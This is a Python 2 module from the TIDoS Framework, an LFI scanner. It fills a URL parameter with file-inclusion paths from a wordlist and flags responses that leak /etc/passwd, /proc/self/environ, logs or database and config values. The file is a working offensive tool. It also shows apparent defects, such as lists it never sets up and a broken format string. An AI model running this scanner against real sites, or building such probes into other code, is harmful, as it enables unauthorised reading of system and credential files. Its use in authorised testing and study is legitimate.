#!/usr/bin/env python2
# coding:  utf-8

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#Author: @_tID
#This module requires TIDoS Framework
#https://github.com/theInfectedDrake/TIDoS-Framework 

import os
import re
import sys
import urllib
import requests
import time
from colors import *
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

active0 = False

def scanner0x00(website0, gen_headers):

	global active0
	global loggy
	global enviro
	global fud
	global generic
	global cnfy
	print O+' [!] Enter the filename containing paths (default files/lfi_paths.lst)'
	fname = raw_input(O+" [*] Custom filepath (press Enter for default) :> ")
	if fname == '':
		print GR+' [*] Using default filepath...'
		fname = filecheck0x00('files/fuzz-db/lfi_paths.lst')
	else:
		fname = filecheck0x00(fname)

	if(active0 is False):
		owebsite = website0
	else:
		owebsite = ahurl

	print ""
	for line in file(fname):
	    c = line.strip('\n')
	    website = owebsite.split('=')[0]+'='+c
	    status_code = 500

	    req = requests.get(website, headers=gen_headers, timeout=7)
	    content = str(req.content)
	    print G+' [+] Code obtained : '+content

	    if(req.status_code == 200):
		# forked from lfisuite
	        if ("[<a href='function.main'>function.main</a>" not in content
	        	and "[<a href='function.include'>function.include</a>" not in content
	        	and ("Failed opening" not in content and "for inclusion" not in content)
	        	and "failed to open stream:" not in content
	        	and "open_basedir restriction in effect" not in content
	        	and ("root:" in content or ("sbin" in content and "nologin" in content)
	            or "DB_NAME" in content or "daemon:" in content or "DOCUMENT_ROOT=" in content or 'root:x:' in content
	            or "PATH=" in content or "HTTP_USER_AGENT" in content or "HTTP_ACCEPT_ENCODING=" in content
	            or "users:x" in content or ("GET /" in content and ("HTTP/1.1" in content or "HTTP/1.0" in content))
	            or "apache_port=" in content or "cpanel/logs/access" in content or "allow_login_autocomplete" in content
	            or "database_prefix=" in content or "emailusersbandwidth" in content or "adminuser=" in content
		    or 'daemon:x:' in content or 'bin:x:' in content or 'mail:x:' in content or 'user:x:' in content
	            or ("error]" in content and "[client" in content and "log" in website)
	            or ("[error] [client" in content and "File does not exist:" in content and "proc/self/fd/" in website)
	            or ("State: R (running)" in content and ("Tgid:" in content or "TracerPid:" in content or "Uid:" in content)
	            	and "/proc/self/status" in website))):
	            print G+"[+] '%s' "+O+"[Vulnerable]" % str(website)

		    website = str(website)
	            gotcha.append(website)

	            if("log" in website):
	            	loggy.append(website)
	            elif("/proc/self/environ" in website):
	            	enviro.append(website)
	            elif("/proc/self/fd" in website):
	            	fud.append(website)
	            elif(".cnf" in website or ".conf" in website or ".ini" in website):
	            	cnfy.append(website)
	            else:
			generic.append(website)
	        else:
	            print R+" [-] '"+str(website)+O+" [Not vulnerable]"
	    else:
	        print R+" [-] Problem connecting to the website.\n"

	print G+"\n [+] Retrieved %s interesting paths...\n" % str(len(gotcha))
	time.sleep(0.5)

	outto0x00("Logs",loggy)
	outto0x00("/proc/self/environ",enviro)
	outto0x00("/proc/self/fd",fud)
	outto0x00("Configuration", cnfy)
	outto0x00("Generic",generic)

def outto0x00(toPrint,stack):
	print " %s: [%s]" %(toPrint,len(stack))
	print ''
	print O+' [*] Displaying paths obtained...\n'
	for path in stack:
		print G+' [+] Path :> ' + str(path)
	print ""

def filecheck0x00(filename):
	while(True):
		if(filename[0] == '\''): 
			filename = filename[1:]
		if(filename[len(filename)-1] == '\''): 
			filename = filename[:-1]
		if(os.path.exists(filename)):
			return filename
		print R+" [-] Cannot find '%s'!" % filename
		filename = raw_input(O+' [*] Enter a valid name of the file containing the paths :> ') 

def lfi(web):

	global gotcha
	print GR+' [*] Loading module...'
	time.sleep(0.5)
	print R+'\n     ======================='
	print R+'      L F I   S C A N N E R'
	print R+'     =======================\n'
	try:
		web0 = raw_input(O+' [#] Parameter path to test (eg. /load.php?file=foo) :> ')
		if "?" in web0 and '=' in web0:
			if web0.startswith('/'):
				m = raw_input(GR+'\n [!] Your path starts with "/".\n [#] Do you mean root directory? (Y/n) :> ')
				if m == 'y':
					web00 = web + web0
				elif m == 'n':
					web00 = web + web0
				else:
					print R+' [-] U mad?'
			else:
				web00 = web + '/' + web0

		input_cookie = raw_input("\n [*] Enter cookies if needed [just enter if none] :> ")
		global gen_headers
		gen_headers =    {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201',
			   	  'Accept-Language':'en-US;',
			   	  'Accept-Encoding': 'gzip, deflate',
			   	  'Accept': 'text/html,application/xhtml+xml,application/xml;',
			   	  'Connection':'close'}
		if(len(input_cookie) > 0):
			gen_headers['Cookie'] = input_cookie
			#gen_headers['Cookie'] = "security=low; PHPSESSID=n3o05a33llklde1r2upt98r1k2"
		scanner0x00(web00, gen_headers)

	except KeyboardInterrupt:
		print R+' [-] User Interruption!'
		pass

	except Exception as e:
		print R+' [-] Exception encountered during processing...'
		print R+' [-] Error : '+str(e)

